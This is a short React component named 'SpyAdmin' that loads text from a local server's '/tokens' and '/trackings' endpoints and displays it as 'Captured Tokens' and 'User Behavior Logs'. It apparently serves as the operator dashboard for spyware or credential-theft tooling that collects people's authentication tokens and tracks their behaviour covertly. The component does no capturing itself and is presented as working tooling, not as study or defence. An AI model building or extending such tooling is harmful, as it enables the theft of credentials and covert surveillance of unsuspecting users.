import React, { useEffect, useState } from "react";

export default function SpyAdmin() {
  const [tokens, setTokens] = useState("");
  const [tracking, setTracking] = useState("");

  const loadData = async () => {
    const t = await (await fetch("http://localhost:8080/tokens")).text();
    const b = await (await fetch("http://localhost:8080/trackings")).text();
    setTokens(t);
    setTracking(b);
  };

  useEffect(() => {
    loadData();
  }, []);

  return (
    <div>
      <h2>🧠 Captured Tokens</h2>
      <pre className="bg-light p-3">{tokens}</pre>

      <h2 className="mt-4">🕵️ User Behavior Logs</h2>
      <pre className="bg-light p-3">{tracking}</pre>
    </div>
  );
}
